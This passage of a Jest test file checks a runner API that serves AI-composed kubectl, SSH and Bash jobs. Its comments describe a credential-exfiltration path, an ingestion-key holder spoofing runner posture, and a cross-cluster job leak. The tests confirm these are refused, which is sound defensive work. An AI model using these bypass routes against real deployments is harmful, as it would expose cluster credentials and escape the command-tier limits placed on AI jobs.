     * The cap must count this project's AI command jobs from the last hour
     * — not another project's, not runbook jobs (which have their own
     * limits), and not all of history.
     */
    test("counts only this project's AiRemediation jobs created in the last hour", async () => {
      const before: Date = new Date();

      await RunnerJobService.enqueueAiCommand(enqueueData({}));

      const after: Date = new Date();

      expect(countBySpy).toHaveBeenCalledTimes(1);

      const countByArgs: {
        query: Record<string, unknown>;
        props: Record<string, unknown>;
      } = countBySpy.mock.calls[0]![0] as {
        query: Record<string, unknown>;
        props: Record<string, unknown>;
      };

      expect(countByArgs.query["origin"]).toBe(RunnerJobOrigin.AiRemediation);
      expect((countByArgs.query["projectId"] as ObjectID).toString()).toBe(
        PROJECT_ID.toString(),
      );
      expect(countByArgs.props).toEqual(
        expect.objectContaining({ isRoot: true }),
      );

      const createdAtFilter: RawQueryFilter = countByArgs.query[
        "createdAt"
      ] as unknown as RawQueryFilter;

      expect(createdAtFilter).toBeDefined();
      expect(createdAtFilter.type).toBe("raw");
      expect(createdAtFilter.getSql!("createdAt")).toContain(">");

      const boundaries: Array<unknown> = Object.values(
        createdAtFilter.objectLiteralParameters || {},
      );

      expect(boundaries).toHaveLength(1);

      const boundary: Date = boundaries[0] as Date;

      expect(boundary).toBeInstanceOf(Date);
      // One hour back from "now", give or take the test's own runtime.
      expect(boundary.getTime()).toBeGreaterThanOrEqual(
        before.getTime() - ONE_HOUR_IN_MS - 1000,
      );
      expect(boundary.getTime()).toBeLessThanOrEqual(
        after.getTime() - ONE_HOUR_IN_MS + 1000,
      );
    });
  });
});

/*
 * ---------------------------------------------------------------------------
 * Credential-less kubectl runs with the claiming pod's OWN ServiceAccount,
 * which reaches exactly the cluster that pod lives in. So the claim path
 * serves such a job only to the in-cluster Runner whose posture names the
 * job's cluster — and FAILS the job (visible to the AI run and the cluster's
 * AI page) for any other Runner rather than handing it over.
 * ---------------------------------------------------------------------------
 */
describe("POST /claim-next-job serves credential-less Kubectl jobs only to the in-cluster Runner of the job's cluster", () => {
  let agentId: ObjectID;
  let projectId: ObjectID;
  let claimNextJobSpy: jest.SpyInstance;
  let submitResultSpy: jest.SpyInstance;

  const KUBECTL_ARGS: Array<string> = ["get", "pods", "-n", "web"];

  function agentWithPosture(posture: JSONObject | undefined): Runner {
    return {
      id: agentId,
      projectId: projectId,
      name: "kubernetes-agent/prod-us",
      canRunRunbooks: false,
      canRunAiCommands: true,
      ...(posture !== undefined ? { hostInfo: { kubernetes: posture } } : {}),
    } as unknown as Runner;
  }

  function kubectlJob(payload: JSONObject): RunnerJob {
    return {
      id: JOB_ID,
      origin: RunnerJobOrigin.AiInvestigation,
      stepId: "ai-investigation-kubectl-1",
      stepType: RunbookStepType.Kubectl,
      script: "",
      timeoutInMs: 30_000,
      leaseExpiresAt: new Date("2026-08-04T00:00:30.000Z"),
      payload,
    } as unknown as RunnerJob;
  }

  function credentialLessJobFor(
    clusterIdentifier?: string | undefined,
  ): RunnerJob {
    return kubectlJob({
      args: KUBECTL_ARGS,
      displayCommand: "kubectl get pods -n web",
      tier: "Read",
      kubernetesClusterId: ObjectID.generate().toString(),
      ...(clusterIdentifier !== undefined ? { clusterIdentifier } : {}),
    });
  }

  function failedJobMessage(): string {
    expect(submitResultSpy).toHaveBeenCalledTimes(1);

    const call: {
      jobId: ObjectID;
      agentId: ObjectID;
      success: boolean;
      errorMessage: string;
    } = submitResultSpy.mock.calls[0]![0] as {
      jobId: ObjectID;
      agentId: ObjectID;
      success: boolean;
      errorMessage: string;
    };

    expect(call.jobId.toString()).toBe(JOB_ID.toString());
    expect(call.agentId.toString()).toBe(agentId.toString());
    expect(call.success).toBe(false);

    return call.errorMessage;
  }

  beforeAll(() => {
    mockRoutes.length = 0;
    new RunnerIngressAPI();
  });

  beforeEach(() => {
    jest.clearAllMocks();

    agentId = ObjectID.generate();
    projectId = ObjectID.generate();

    claimNextJobSpy = jest
      .spyOn(RunnerJobService, "claimNextJob")
      .mockResolvedValue(null);
    submitResultSpy = jest
      .spyOn(RunnerJobService, "submitResult")
      .mockResolvedValue(true);

    (RunbookSecretsUtil.loadForAgent as unknown as jest.Mock).mockResolvedValue(
      [],
    );
    (
      RunbookSecretsUtil.populateInScript as unknown as jest.Mock
    ).mockImplementation((data: { script: string }): string => {
      return data.script;
    });
    (
      RunbookCredentialsUtil.resolveForJob as unknown as jest.Mock
    ).mockResolvedValue(null);
  });

  afterEach(() => {
    jest.restoreAllMocks();
  });

  test("serves the job to the in-cluster Runner whose posture names the job's cluster", async () => {
    claimNextJobSpy.mockResolvedValue(credentialLessJobFor("prod-us"));

    const result: RouteCallResult = await callRoute({
      uri: CLAIM_ROUTE,
      agent: agentWithPosture({
        inCluster: true,
        clusterIdentifier: "prod-us",
      }),
    });

    expect(result.nextCallCount).toBe(0);
    expect(submitResultSpy).not.toHaveBeenCalled();

    const job: JSONObject = lastJsonResponse()["job"] as JSONObject;
    expect(job["jobId"]).toBe(JOB_ID.toString());
    expect(job["stepType"]).toBe(RunbookStepType.Kubectl);
    expect((job["payload"] as JSONObject)["clusterIdentifier"]).toBe("prod-us");
    expect(job).not.toHaveProperty("credential");
    // No secrets machinery for an AI-composed job, kubectl included.
    expect(RunbookSecretsUtil.loadForAgent).not.toHaveBeenCalled();
  });

  test("matches the cluster identifier case-insensitively", async () => {
    claimNextJobSpy.mockResolvedValue(credentialLessJobFor("prod-us"));

    await callRoute({
      uri: CLAIM_ROUTE,
      agent: agentWithPosture({
        inCluster: true,
        clusterIdentifier: "PROD-US",
      }),
    });

    expect(submitResultSpy).not.toHaveBeenCalled();
    expect((lastJsonResponse()["job"] as JSONObject)["jobId"]).toBe(
      JOB_ID.toString(),
    );
  });

  test("fails the job for a Runner that is not in-cluster at all", async () => {
    claimNextJobSpy.mockResolvedValue(credentialLessJobFor("prod-us"));

    const result: RouteCallResult = await callRoute({
      uri: CLAIM_ROUTE,
      agent: agentWithPosture(undefined),
    });

    expect(result.nextCallCount).toBe(0);
    expect(failedJobMessage()).toContain("not the in-cluster Runner");
    expect(lastJsonResponse()).toEqual({ job: null });
  });

  /*
   * The cross-cluster finding: the pod of cluster B must never run a job
   * for cluster A, whatever the dashboard was told.
   */
  test("fails the job for the in-cluster Runner of a DIFFERENT cluster, naming both", async () => {
    claimNextJobSpy.mockResolvedValue(credentialLessJobFor("prod-us"));

    await callRoute({
      uri: CLAIM_ROUTE,
      agent: agentWithPosture({
        inCluster: true,
        clusterIdentifier: "prod-eu",
      }),
    });

    const message: string = failedJobMessage();
    expect(message).toContain('for cluster "prod-us"');
    expect(message).toContain('in-cluster Runner of cluster "prod-eu"');
    expect(lastJsonResponse()).toEqual({ job: null });
  });

  test("fails the job for a pod Runner that never said which cluster it is in", async () => {
    claimNextJobSpy.mockResolvedValue(credentialLessJobFor("prod-us"));

    await callRoute({
      uri: CLAIM_ROUTE,
      agent: agentWithPosture({ inCluster: true }),
    });

    expect(failedJobMessage()).toContain("an unnamed cluster");
    expect(lastJsonResponse()).toEqual({ job: null });
  });

  test("fails closed on a job whose payload does not name its cluster", async () => {
    claimNextJobSpy.mockResolvedValue(credentialLessJobFor(undefined));

    await callRoute({
      uri: CLAIM_ROUTE,
      agent: agentWithPosture({
        inCluster: true,
        clusterIdentifier: "prod-us",
      }),
    });

    expect(failedJobMessage()).toContain("does not name the cluster");
    expect(lastJsonResponse()).toEqual({ job: null });
  });

  test("never lets a blank payload identifier match a blank posture identifier", async () => {
    claimNextJobSpy.mockResolvedValue(credentialLessJobFor("   "));

    await callRoute({
      uri: CLAIM_ROUTE,
      agent: agentWithPosture({ inCluster: true, clusterIdentifier: "   " }),
    });

    expect(submitResultSpy).toHaveBeenCalledTimes(1);
    expect(lastJsonResponse()).toEqual({ job: null });
  });

  test("a Kubectl job WITH a credential skips the posture rule and resolves the credential for the claiming Runner", async () => {
    const credentialId: string = ObjectID.generate().toString();
    const resolved: JSONObject = {
      apiServerUrl: "https://10.0.0.1:6443",
      token: "sa-token",
    };

    claimNextJobSpy.mockResolvedValue(
      kubectlJob({
        args: KUBECTL_ARGS,
        displayCommand: "kubectl get pods -n web",
        tier: "Read",
        kubernetesClusterId: ObjectID.generate().toString(),
        clusterIdentifier: "prod-us",
        credentialId,
      }),
    );
    (
      RunbookCredentialsUtil.resolveForJob as unknown as jest.Mock
    ).mockResolvedValue(resolved);

    /*
     * An external Runner created in the dashboard: no posture at all. (It
     * used to be the agent-named row with its posture dropped — which is
     * exactly the identity that must never receive a credential; see the
     * block below.)
     */
    await callRoute({
      uri: CLAIM_ROUTE,
      agent: {
        ...agentWithPosture(undefined),
        name: "office-runner",
      } as unknown as Runner,
    });

    expect(submitResultSpy).not.toHaveBeenCalled();

    const resolveCall: {
      credentialId: string;
      agentId: ObjectID;
      projectId: ObjectID;
    } = (RunbookCredentialsUtil.resolveForJob as unknown as jest.Mock).mock
      .calls[0]![0] as {
      credentialId: string;
      agentId: ObjectID;
      projectId: ObjectID;
    };
    expect(resolveCall.credentialId).toBe(credentialId);
    expect(resolveCall.agentId.toString()).toBe(agentId.toString());
    expect(resolveCall.projectId.toString()).toBe(projectId.toString());

    const job: JSONObject = lastJsonResponse()["job"] as JSONObject;
    expect(job["credential"]).toEqual(resolved);
  });
});

/*
 * ---------------------------------------------------------------------------
 * The credential-exfiltration fix. A kubernetes-agent Runner row is minted,
 * and while offline re-keyed, with the project's telemetry ingestion key —
 * a credential every collector and CI job holds. So that identity is NEVER
 * handed credential material, whatever an operator assigned to it: a job
 * that names a credential is failed for it (the same refusal shape as the
 * credential-less rule) and the credential is never resolved.
 *
 * "Agent" is decided from the row NAME, which only the server writes —
 * never from hostInfo posture, which the Runner rewrites on every
 * heartbeat: a holder of the ingestion key who heartbeats `hostInfo: {}`
 * must not unlock credentials or shell work.
 * ---------------------------------------------------------------------------
 */
describe("POST /claim-next-job never hands a kubernetes-agent Runner credential material", () => {
  let agentId: ObjectID;
  let projectId: ObjectID;
  let claimNextJobSpy: jest.SpyInstance;
  let submitResultSpy: jest.SpyInstance;

  function runnerRow(data: {
    name: string;
    hostInfo?: JSONObject | undefined;
  }): Runner {
    return {
      id: agentId,
      projectId: projectId,
      name: data.name,
      canRunRunbooks: true,
      canRunAiCommands: true,
      ...(data.hostInfo !== undefined ? { hostInfo: data.hostInfo } : {}),
    } as unknown as Runner;
  }

  function credentialedKubectlJob(credentialId: string): RunnerJob {
    return {
      id: JOB_ID,
      origin: RunnerJobOrigin.AiInvestigation,
      stepId: "ai-investigation-kubectl-1",
      stepType: RunbookStepType.Kubectl,
      script: "",
      timeoutInMs: 30_000,
      leaseExpiresAt: new Date("2026-08-04T00:00:30.000Z"),
      payload: {
        args: ["get", "pods", "-n", "web"],
        displayCommand: "kubectl get pods -n web",
        tier: "Read",
        kubernetesClusterId: ObjectID.generate().toString(),
        clusterIdentifier: "prod-b",
        credentialId,
      },
    } as unknown as RunnerJob;
  }

  beforeAll(() => {
    mockRoutes.length = 0;
    new RunnerIngressAPI();
  });

  beforeEach(() => {
    jest.clearAllMocks();

    agentId = ObjectID.generate();
    projectId = ObjectID.generate();

    claimNextJobSpy = jest
      .spyOn(RunnerJobService, "claimNextJob")
      .mockResolvedValue(null);
    submitResultSpy = jest
      .spyOn(RunnerJobService, "submitResult")
      .mockResolvedValue(true);

    (RunbookSecretsUtil.loadForAgent as unknown as jest.Mock).mockResolvedValue(
      [],
    );
    (
      RunbookSecretsUtil.populateInScript as unknown as jest.Mock
    ).mockImplementation((data: { script: string }): string => {
      return data.script;
    });
    (
      RunbookCredentialsUtil.resolveForJob as unknown as jest.Mock
    ).mockResolvedValue({
      apiServerUrl: "https://prod-b.internal:6443",
      token: "PROD-B-WRITE-SA-TOKEN",
    });
  });

  afterEach(() => {
    jest.restoreAllMocks();
  });

  function testCredentialedJobFailsForAgentRunner(
    label: string,
    hostInfo: JSONObject | undefined,
  ): void {
    test(`fails a credentialed job for an agent Runner ${label}, never resolving the credential`, async () => {
      claimNextJobSpy.mockResolvedValue(
        credentialedKubectlJob(ObjectID.generate().toString()),
      );

      const result: RouteCallResult = await callRoute({
        uri: CLAIM_ROUTE,
        agent: runnerRow({ name: "kubernetes-agent/prod-a", hostInfo }),
      });

      expect(result.nextCallCount).toBe(0);
      expect(RunbookCredentialsUtil.resolveForJob).not.toHaveBeenCalled();

      expect(submitResultSpy).toHaveBeenCalledTimes(1);
      const call: {
        jobId: ObjectID;
        agentId: ObjectID;
        success: boolean;
        errorMessage: string;
      } = submitResultSpy.mock.calls[0]![0] as {
        jobId: ObjectID;
        agentId: ObjectID;
        success: boolean;
        errorMessage: string;
      };
      expect(call.jobId.toString()).toBe(JOB_ID.toString());
      expect(call.agentId.toString()).toBe(agentId.toString());
      expect(call.success).toBe(false);
      expect(call.errorMessage).toBe(
        RunnerIngressAPI.AGENT_RUNNER_CREDENTIAL_REFUSAL,
      );

      // Nothing on the wire: no job, and certainly no token.
      expect(lastJsonResponse()).toEqual({ job: null });
      expect(JSON.stringify(lastJsonResponse())).not.toContain(
        "PROD-B-WRITE-SA-TOKEN",
      );
    });
  }

  for (const [label, hostInfo] of [
    [
      "with its agent posture",
      { kubernetes: { inCluster: true, clusterIdentifier: "prod-a" } },
    ],
    ["whose heartbeat dropped its posture", {}],
    ["with no hostInfo at all", undefined],
  ] as Array<[string, JSONObject | undefined]>) {
    testCredentialedJobFailsForAgentRunner(label, hostInfo);
  }

  test("fails an SSH job for an agent Runner the same way (no SSH key either)", async () => {
    claimNextJobSpy.mockResolvedValue({
      id: JOB_ID,
      origin: RunnerJobOrigin.AiRemediation,
      stepId: "cmd-1",
      stepType: RunbookStepType.SSH,
      script: "",
      timeoutInMs: 60_000,
      payload: {
        credentialId: ObjectID.generate().toString(),
        command: "systemctl restart nginx",
      },
    } as unknown as RunnerJob);

    await callRoute({
      uri: CLAIM_ROUTE,
      agent: runnerRow({ name: "kubernetes-agent/prod-a", hostInfo: {} }),
    });

    expect(RunbookCredentialsUtil.resolveForJob).not.toHaveBeenCalled();
    expect(submitResultSpy).toHaveBeenCalledTimes(1);
    expect(lastJsonResponse()).toEqual({ job: null });
  });

  test("never substitutes runbook secrets for an agent Runner, even on a runbook-origin job", async () => {
    claimNextJobSpy.mockResolvedValue({
      id: JOB_ID,
      origin: RunnerJobOrigin.Runbook,
      runbookExecutionId: ObjectID.generate(),
      stepId: "step-1",
      stepType: RunbookStepType.Bash,
      script: SECRET_PLACEHOLDER_SCRIPT,
      timeoutInMs: 60_000,
    } as unknown as RunnerJob);

    await callRoute({
      uri: CLAIM_ROUTE,
      agent: runnerRow({ name: "kubernetes-agent/prod-a", hostInfo: {} }),
    });

    expect(RunbookSecretsUtil.loadForAgent).not.toHaveBeenCalled();
    expect(RunbookSecretsUtil.populateInScript).not.toHaveBeenCalled();
  });

  test("narrows an agent Runner to kubectl by its name even when its heartbeat dropped the posture", async () => {
    await callRoute({
      uri: CLAIM_ROUTE,
      agent: runnerRow({ name: "kubernetes-agent/prod-a", hostInfo: {} }),
    });

    const claimArgs: Record<string, unknown> = claimNextJobSpy.mock
      .calls[0]![0] as Record<string, unknown>;
    expect(claimArgs["allowedStepTypes"]).toEqual([RunbookStepType.Kubectl]);
  });

  test("an agent Runner that asks only for shell work by name is served nothing", async () => {
    const result: RouteCallResult = await callRoute({
      uri: CLAIM_ROUTE,
      agent: runnerRow({ name: "kubernetes-agent/prod-a", hostInfo: {} }),
      body: { stepTypes: ["Bash", "SSH"] },
    });

    expect(result.nextCallCount).toBe(0);
    expect(claimNextJobSpy).not.toHaveBeenCalled();
    expect(lastJsonResponse()).toEqual({ job: null });
  });

  test("negative control: a dashboard Runner with the same assignment still receives the credential", async () => {
    claimNextJobSpy.mockResolvedValue(
      credentialedKubectlJob(ObjectID.generate().toString()),
    );

    await callRoute({
      uri: CLAIM_ROUTE,
      agent: runnerRow({ name: "office-runner", hostInfo: {} }),
    });

    expect(submitResultSpy).not.toHaveBeenCalled();
    expect(RunbookCredentialsUtil.resolveForJob).toHaveBeenCalledTimes(1);
    const job: JSONObject = lastJsonResponse()["job"] as JSONObject;
    expect(job["credential"]).toEqual({
      apiServerUrl: "https://prod-b.internal:6443",
      token: "PROD-B-WRITE-SA-TOKEN",
    });
  });

  test("negative control: a name that only resembles the prefix is not an agent", async () => {
    claimNextJobSpy.mockResolvedValue(
      credentialedKubectlJob(ObjectID.generate().toString()),
    );

    await callRoute({
      uri: CLAIM_ROUTE,
      agent: runnerRow({ name: "kubernetes-agent-office", hostInfo: {} }),
    });

    expect(submitResultSpy).not.toHaveBeenCalled();
    expect(RunbookCredentialsUtil.resolveForJob).toHaveBeenCalledTimes(1);
    const claimArgs: Record<string, unknown> = claimNextJobSpy.mock
      .calls[0]![0] as Record<string, unknown>;
    expect(claimArgs).not.toHaveProperty("allowedStepTypes");
  });

  /*
   * "Is an agent" is ONE rule for everything the claim decides: the name
   * marker, compared case-insensitively as the database compares it, OR an
   * agent posture. Round one narrowed the step types on name-or-posture but
   * refused credentials (and secret substitution) on the case-sensitive
   * name alone, so a renamed agent row was narrowed to kubectl and still
   * handed a credential.
   */
  const RENAMED_AGENT_ROWS: Array<[string, string, JSONObject]> = [
    ["a case variant of the marker", "Kubernetes-Agent/prod-a", {}],
    [
      "a name without the marker but an agent posture",
      "office",
      { kubernetes: { inCluster: true, clusterIdentifier: "prod-a" } },
    ],
  ];

  test.each(RENAMED_AGENT_ROWS)(
    "refuses credential material to a row with %s, never resolving the credential",
    async (_label: string, name: string, hostInfo: JSONObject) => {
      claimNextJobSpy.mockResolvedValue(
        credentialedKubectlJob(ObjectID.generate().toString()),
      );

      await callRoute({
        uri: CLAIM_ROUTE,
        agent: runnerRow({ name, hostInfo }),
      });

      expect(RunbookCredentialsUtil.resolveForJob).not.toHaveBeenCalled();
      expect(submitResultSpy).toHaveBeenCalledTimes(1);
      expect(
        (submitResultSpy.mock.calls[0]![0] as { errorMessage: string })
          .errorMessage,
      ).toBe(RunnerIngressAPI.AGENT_RUNNER_CREDENTIAL_REFUSAL);
      expect(lastJsonResponse()).toEqual({ job: null });
      expect(JSON.stringify(lastJsonResponse())).not.toContain(
        "PROD-B-WRITE-SA-TOKEN",
      );
    },
  );

  test.each(RENAMED_AGENT_ROWS)(
    "narrows a row with %s to kubectl",
    async (_label: string, name: string, hostInfo: JSONObject) => {
      await callRoute({
        uri: CLAIM_ROUTE,
        agent: runnerRow({ name, hostInfo }),
        body: { stepTypes: ["Kubectl", "Bash", "SSH"] },
      });

      const claimArgs: Record<string, unknown> = claimNextJobSpy.mock
        .calls[0]![0] as Record<string, unknown>;
      expect(claimArgs["allowedStepTypes"]).toEqual([RunbookStepType.Kubectl]);
    },
  );

  test.each(RENAMED_AGENT_ROWS)(
    "never substitutes runbook secrets for a row with %s",
    async (_label: string, name: string, hostInfo: JSONObject) => {
      claimNextJobSpy.mockResolvedValue({
        id: JOB_ID,
        origin: RunnerJobOrigin.Runbook,
        runbookExecutionId: ObjectID.generate(),
        stepId: "step-1",
        stepType: RunbookStepType.Bash,
        script: SECRET_PLACEHOLDER_SCRIPT,
        timeoutInMs: 60_000,
      } as unknown as RunnerJob);

      await callRoute({
        uri: CLAIM_ROUTE,
        agent: runnerRow({ name, hostInfo }),
      });

      expect(RunbookSecretsUtil.loadForAgent).not.toHaveBeenCalled();
      expect(RunbookSecretsUtil.populateInScript).not.toHaveBeenCalled();
    },
  );

  test("negative control: an ordinary Runner in a pod (no cluster identity) receives the credential, un-narrowed", async () => {
    claimNextJobSpy.mockResolvedValue(
      credentialedKubectlJob(ObjectID.generate().toString()),
    );

    await callRoute({
      uri: CLAIM_ROUTE,
      agent: runnerRow({
        name: "office",
        hostInfo: { kubernetes: { inCluster: true } },
      }),
    });

    expect(submitResultSpy).not.toHaveBeenCalled();
    expect(RunbookCredentialsUtil.resolveForJob).toHaveBeenCalledTimes(1);
    expect(
      (lastJsonResponse()["job"] as JSONObject)["credential"],
    ).toBeDefined();
    const claimArgs: Record<string, unknown> = claimNextJobSpy.mock
      .calls[0]![0] as Record<string, unknown>;
    expect(claimArgs).not.toHaveProperty("allowedStepTypes");
  });

  test("negative control: the agent Runner's own credential-less kubectl for its cluster is still served", async () => {
    claimNextJobSpy.mockResolvedValue({
      ...credentialedKubectlJob("unused"),
      payload: {
        args: ["get", "pods", "-n", "web"],
        displayCommand: "kubectl get pods -n web",
        tier: "Read",
        kubernetesClusterId: ObjectID.generate().toString(),
        clusterIdentifier: "prod-a",
      },
    } as unknown as RunnerJob);

    await callRoute({
      uri: CLAIM_ROUTE,
      agent: runnerRow({
        name: "kubernetes-agent/prod-a",
        hostInfo: {
          kubernetes: { inCluster: true, clusterIdentifier: "prod-a" },
        },
      }),
    });

    expect(submitResultSpy).not.toHaveBeenCalled();
    const job: JSONObject = lastJsonResponse()["job"] as JSONObject;
    expect(job["jobId"]).toBe(JOB_ID.toString());
    expect(job).not.toHaveProperty("credential");
  });
});

/*
 * ---------------------------------------------------------------------------
 * Step-type narrowing on the claim. A Runner may say which step types it
 * wants (`stepTypes`), and a Runner whose posture says it is a cluster's
 * in-cluster agent is narrowed to kubectl by the server whatever it sent —
 * the agent pod exists to run policy-tiered kubectl, and an AI-composed
 * Bash or SSH command inside it would bypass the tier policy entirely.
 * ---------------------------------------------------------------------------
 */
describe("POST /claim-next-job narrows the served step types", () => {
  let agentId: ObjectID;
  let projectId: ObjectID;
  let claimNextJobSpy: jest.SpyInstance;

  function agent(data: { hostInfo?: JSONObject | undefined }): Runner {
    return {
      id: agentId,
      projectId: projectId,
      name: "test-runner",
      canRunRunbooks: true,
      canRunAiCommands: true,
      ...(data.hostInfo !== undefined ? { hostInfo: data.hostInfo } : {}),
    } as unknown as Runner;
  }

  const AGENT_POSTURE: JSONObject = {
    kubernetes: { inCluster: true, clusterIdentifier: "prod-us" },
  };

  function claimArgs(): Record<string, unknown> {
    expect(claimNextJobSpy).toHaveBeenCalledTimes(1);
    return claimNextJobSpy.mock.calls[0]![0] as Record<string, unknown>;
  }

  beforeAll(() => {
    mockRoutes.length = 0;
    new RunnerIngressAPI();
  });

  beforeEach(() => {
    jest.clearAllMocks();
    agentId = ObjectID.generate();
    projectId = ObjectID.generate();
    claimNextJobSpy = jest
      .spyOn(RunnerJobService, "claimNextJob")
      .mockResolvedValue(null);
  });

  afterEach(() => {
    jest.restoreAllMocks();
  });

  test("passes no step-type filter for an ordinary Runner that sent none (the historical contract)", async () => {
    await callRoute({ uri: CLAIM_ROUTE, agent: agent({}) });

    expect(claimArgs()).not.toHaveProperty("allowedStepTypes");
    expect(claimArgs()["agentId"]).toBe(agentId);
    expect(claimArgs()["projectId"]).toBe(projectId);
  });

  test("passes the Runner's own stepTypes through, de-duplicated", async () => {
    await callRoute({
      uri: CLAIM_ROUTE,
      agent: agent({}),
      body: { stepTypes: ["Kubectl", "Bash", "Kubectl"] },
    });

    expect(claimArgs()["allowedStepTypes"]).toEqual([
      RunbookStepType.Kubectl,
      RunbookStepType.Bash,
    ]);
  });

  test("answers { job: null } without touching the job service for an empty stepTypes list", async () => {
    const result: RouteCallResult = await callRoute({
      uri: CLAIM_ROUTE,
      agent: agent({}),
      body: { stepTypes: [] },
    });

    expect(result.nextCallCount).toBe(0);
    expect(claimNextJobSpy).not.toHaveBeenCalled();
    expect(lastJsonResponse()).toEqual({ job: null });
  });

  test("rejects a malformed stepTypes with a 400 rather than serving anything", async () => {
    for (const stepTypes of [
      "Kubectl",
      42,
      { Kubectl: true },
      ["Kubectl", "Manual"],
      ["kubectl"],
      [42],
      ["Bash", null],
    ]) {
      jest.clearAllMocks();

      const result: RouteCallResult = await callRoute({
        uri: CLAIM_ROUTE,
        agent: agent({}),
        body: { stepTypes: stepTypes as never },
      });

      expect(result.nextCallCount).toBe(1);
      expect(result.thrownToNext).toBeInstanceOf(BadDataException);
      expect(claimNextJobSpy).not.toHaveBeenCalled();
    }
  });

  test("narrows a Runner with an agent posture to kubectl even when it sent no stepTypes", async () => {
    await callRoute({
      uri: CLAIM_ROUTE,
      agent: agent({ hostInfo: AGENT_POSTURE }),
    });

    expect(claimArgs()["allowedStepTypes"]).toEqual([RunbookStepType.Kubectl]);
  });

  test("intersects the agent narrowing with the Runner's own list", async () => {
    await callRoute({
      uri: CLAIM_ROUTE,
      agent: agent({ hostInfo: AGENT_POSTURE }),
      body: { stepTypes: ["Kubectl", "Bash", "SSH"] },
    });

    expect(claimArgs()["allowedStepTypes"]).toEqual([RunbookStepType.Kubectl]);
  });

  test("serves nothing to an agent-posture Runner that asks only for shell work", async () => {
    const result: RouteCallResult = await callRoute({
      uri: CLAIM_ROUTE,
      agent: agent({ hostInfo: AGENT_POSTURE }),
      body: { stepTypes: ["Bash", "SSH"] },
    });

    expect(result.nextCallCount).toBe(0);
    expect(claimNextJobSpy).not.toHaveBeenCalled();
    expect(lastJsonResponse()).toEqual({ job: null });
  });

  test("does not narrow a pod Runner that never named its cluster, nor an external Runner", async () => {
    await callRoute({
      uri: CLAIM_ROUTE,
      agent: agent({ hostInfo: { kubernetes: { inCluster: true } } }),
    });
    expect(claimArgs()).not.toHaveProperty("allowedStepTypes");

    jest.clearAllMocks();

    await callRoute({
      uri: CLAIM_ROUTE,
      agent: agent({ hostInfo: { hostname: "office-box" } }),
    });
    expect(claimArgs()).not.toHaveProperty("allowedStepTypes");
  });
});

/*
 * ---------------------------------------------------------------------------
 * The registration route is a thin adapter over
 * KubernetesClusterAiAccessService.registerKubernetesAgentRunner. What it
 * owes the Runner: every field of the body it understands reaches the
 * service (including the previous key, which is what lets a live Runner
 * rotate itself), the binding state comes back so the pod can log the right
 * thing, and a refusal from the service reaches the Runner as an error.
 * ---------------------------------------------------------------------------
 */
describe("POST /register-kubernetes-agent", () => {
  const REGISTER_ROUTE: string = "/register-kubernetes-agent";

  const RUNNER_ID: ObjectID = new ObjectID(
    "77777777-7777-4777-8777-777777777777",
  );
  const CLUSTER_ID: ObjectID = new ObjectID(
    "88888888-8888-4888-8888-888888888888",
  );

  let registerSpy: jest.SpyInstance;

  function registeredResult(
    overrides: Partial<RegisterKubernetesAgentRunnerResult> = {},
  ): RegisterKubernetesAgentRunnerResult {
    return {
      runnerId: RUNNER_ID,
      runnerKey: "new-key",
      clusterId: CLUSTER_ID,
      isBoundToCluster: true,
      isFirstBind: true,
      bindingState: "first_bind",
      ...overrides,
    };
  }

  function registerCall(): Record<string, unknown> {
    expect(registerSpy).toHaveBeenCalledTimes(1);
    return registerSpy.mock.calls[0]![0] as Record<string, unknown>;
  }

  beforeAll(() => {
    mockRoutes.length = 0;
    new RunnerIngressAPI();
  });

  beforeEach(() => {
    jest.clearAllMocks();
    registerSpy = jest
      .spyOn(KubernetesClusterAiAccessService, "registerKubernetesAgentRunner")
      .mockResolvedValue(registeredResult());
  });

  afterEach(() => {
    jest.restoreAllMocks();
  });

  test("passes the cluster name, version, posture and previous key to the service and reports the binding state", async () => {
    const result: RouteCallResult = await callRoute({
      uri: REGISTER_ROUTE,
      projectId: PROJECT_ID,
      body: {
        clusterName: "  prod-us ",
        agentVersion: "9.1.0",
        allowWrites: true,
        kubectlVersion: "v1.31.4",
        agentChartVersion: "0.7.0",
        previousRunnerKey: "old-key",
      },
    });

    expect(result.nextCallCount).toBe(0);
    expect(registerCall()).toEqual({
      projectId: PROJECT_ID,
      clusterIdentifier: "prod-us",
      agentVersion: "9.1.0",
      previousRunnerKey: "old-key",
      posture: {
        allowWrites: true,
        kubectlVersion: "v1.31.4",
        agentChartVersion: "0.7.0",
      },
    });

    expect(lastJsonResponse()).toEqual({
      runnerId: RUNNER_ID.toString(),
      runnerKey: "new-key",
      clusterId: CLUSTER_ID.toString(),
      isBoundToCluster: true,
      bindingState: "first_bind",
      capabilities: {
        canRunRunbooks: false,
        canRunCodeFixTasks: false,
        canRunAiCommands: true,
      },
    });
  });

  test("sends no previous key when the body has none, an empty one or a non-string", async () => {
    for (const previousRunnerKey of [undefined, "", 42, null]) {
      jest.clearAllMocks();

      await callRoute({
        uri: REGISTER_ROUTE,
        projectId: PROJECT_ID,
        body: {
          clusterName: "prod-us",
          ...(previousRunnerKey !== undefined
            ? { previousRunnerKey: previousRunnerKey as never }
            : {}),
        },
      });

      expect(registerCall()["previousRunnerKey"]).toBeUndefined();
      // allowWrites is opt-in: anything but literal true is false.
      expect((registerCall()["posture"] as JSONObject)["allowWrites"]).toBe(
        false,
      );
    }
  });

  test("reports every binding state verbatim, with isBoundToCluster alongside", async () => {
    registerSpy.mockResolvedValue(
      registeredResult({
        isBoundToCluster: false,
        isFirstBind: false,
        bindingState: "left_unbound_by_operator",
      }),
    );

    await callRoute({
      uri: REGISTER_ROUTE,
      projectId: PROJECT_ID,
      body: { clusterName: "prod-us" },
    });

    expect(lastJsonResponse()["isBoundToCluster"]).toBe(false);
    expect(lastJsonResponse()["bindingState"]).toBe("left_unbound_by_operator");
  });

  test("lets the service's refusal of a live Runner reach the Runner as a 403", async () => {
    registerSpy.mockRejectedValue(
      new ForbiddenException("Runner is online; registration refused."),
    );

    const result: RouteCallResult = await callRoute({
      uri: REGISTER_ROUTE,
      projectId: PROJECT_ID,
      body: { clusterName: "prod-us" },
    });

    expect(result.nextCallCount).toBe(1);
    expect(result.thrownToNext).toBeInstanceOf(ForbiddenException);
    expect(Response.sendJsonObjectResponse).not.toHaveBeenCalled();
  });

  test("rejects a missing or blank cluster name before touching the service", async () => {
    for (const body of [{}, { clusterName: "   " }, { clusterName: 42 }]) {
      jest.clearAllMocks();

      const result: RouteCallResult = await callRoute({
        uri: REGISTER_ROUTE,
        projectId: PROJECT_ID,
        body: body as JSONObject,
      });

      expect(result.nextCallCount).toBe(1);
      expect(result.thrownToNext).toBeInstanceOf(BadDataException);
